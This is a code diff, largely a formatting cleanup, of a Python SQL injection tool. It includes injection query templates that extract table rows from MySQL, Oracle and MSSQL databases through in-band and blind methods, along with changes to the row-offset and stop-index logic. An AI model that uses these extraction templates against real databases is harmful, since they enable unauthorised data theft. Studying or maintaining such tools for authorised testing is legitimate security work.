@@ -80,6 +80,7 @@ class Timing:
 
   def __exit__(self, exc_type, exc_value, traceback):
     self.time = time() - self.t1
+
 # }}}
 
 # Requester {{{
@@ -191,7 +192,9 @@ class Requester_HTTP_pycurl(Requester_HTTP_Base):
     if accepted_cookies:
       fp.setopt(pycurl.COOKIEFILE, '')
 
-    def noop(buf): pass
+    def noop(buf):
+      pass
+
     fp.setopt(pycurl.WRITEFUNCTION, noop)
     fp.setopt(pycurl.VERBOSE, 1)
 
@@ -242,6 +245,7 @@ class Requester_HTTP_pycurl(Requester_HTTP_Base):
     return self.review_response(payload, status_code, header_data, response_data, response_time, content_length)
 
 Requester_HTTP = Requester_HTTP_requests
+
 # }}}
 
 # Method {{{
@@ -265,9 +269,10 @@ class Method_Base(object):
 
     if isinstance(query, basestring):
       q = query
+      stop_index = 1
 
     else:
-      if stop_index == 1:
+      if stop_index == -1:
         c, q = query
         count = ''.join(self.get_row(c))
 
@@ -299,8 +304,11 @@ class Method_Inband(Method_Base):
 
     return requester.test(payload)
 
-class Method_union(Method_Inband): pass
-class Method_error(Method_Inband): pass
+class Method_union(Method_Inband):
+  pass
+
+class Method_error(Method_Inband):
+  pass
 
 class Method_Blind(Method_Base):
 
@@ -325,11 +333,8 @@ class Method_Blind(Method_Base):
     for row_index in range(start_index, stop_index):
       yield self.get_row(q, row_index)
 
-  def get_row(self, query, row_pos): pass
-
-class Method_binary(Method_Blind):
-  '''Binary Search'''
-  pass
+  def get_row(self, query, row_pos):
+    pass
 
 class Method_bitwise(Method_Blind):
   '''Bit ANDing'''
@@ -346,6 +351,7 @@ class Method_bitwise(Method_Blind):
 
     result = ''
     char_pos = 1
+
     while True:
       sleep(self.rate_limit)
 
@@ -514,7 +520,7 @@ class SQLi_Base:
     parser.add_option('-U', dest='user', default='', metavar='u1[,uN]*', help='user(s) to select')
 
     parser.add_option('--start', dest='start_offset', default='0', metavar='N', help='offset to start dump at')
-    parser.add_option('--stop', dest='stop_offset', default='1', metavar='N', help='offset to stop dump at')
+    parser.add_option('--stop', dest='stop_offset', default='-1', metavar='N', help='offset to stop dump at')
 
     (opts, args) = parser.parse_args(argv[1:])
 
@@ -581,6 +587,7 @@ class SQLi_Base:
         print
 
     logger.info("Time: %s" % pprint_seconds(timing.time, '%dh %dm %ds'))
+
 # }}}
 
 # MySQL_Inband {{{
@@ -657,6 +664,7 @@ class MySQL_Inband(SQLi_Base):
     c = '(SELECT COUNT(*) X FROM %s.%s)a' % (db, table)
     q = '(SELECT CONCAT_WS(0x3a,%s) X FROM %s.%s LIMIT ${row_pos},${row_count})a' % (','.join(cols.split(',')), db, table)
     return c, q
+
 # }}}
 
 # MySQL_Blind {{{
@@ -732,6 +740,7 @@ class MySQL_Blind(SQLi_Base):
     c = 'SELECT COUNT(*) FROM %s.%s' % (db, table)
     q = 'SELECT CONCAT_WS(0x3a,%s) FROM %s.%s LIMIT ${row_pos},1' % (','.join(cols.split(',')), db, table)
     return c, q
+
 # }}}
 
 # Oracle_Inband {{{
@@ -819,6 +828,7 @@ class Oracle_Inband(SQLi_Base):
       c = '(SELECT UPPER(COUNT(*)) X FROM %s)' % table
       q = '(SELECT %s X,ROWNUM R FROM %s) WHERE R>${row_pos} AND R<=${row_pos}+${row_count}' % ('||chr(58)||'.join(cols.split(',')), table)
     return c, q
+
 # }}}
 
 # Oracle_Blind {{{
@@ -893,6 +903,7 @@ class Oracle_Blind(SQLi_Base):
     c = "SELECT COUNT(*) FROM %s" % table.upper()
     q = "SELECT X FROM (SELECT %s X,ROWNUM-1 R FROM %s) WHERE R=${row_pos}" % ('||chr(58)||'.join(cols.split(',')), table.upper())
     return c, q
+
 # }}}
 
 # MSSQL_Inband {{{
@@ -954,6 +965,7 @@ class MSSQL_Inband(SQLi_Base):
     q = T('(SELECT TOP ${row_count} ${cols} X FROM ${db}..${table} WHERE ${cols}' \
           ' NOT IN (SELECT TOP ${row_pos} ${cols} FROM ${db}..${table}))a', cols="+char(58)+".join('CAST(%s AS NVARCHAR(4000))' % c for c in cols.split(',')), db=db, table=table) # FIXME no need to have cols everywhere?
     return c, q
+
 # }}}
 
 # MSSQL_Blind {{{
@@ -1018,6 +1030,7 @@ class MSSQL_Blind(SQLi_Base):
     q = T("SELECT TOP 1 ${cols} FROM ${db}..${table} WHERE ${cols}" \
           " NOT IN (SELECT TOP ${row_pos} ${cols} FROM ${db}..${table} ORDER BY 1) ORDER BY 1", cols="+char(58)+".join(cols.split(',')), table=table, db=db)
     return c, q
+
 # }}}
 
 # vim: ts=2 sw=2 sts=2 et fdm=marker
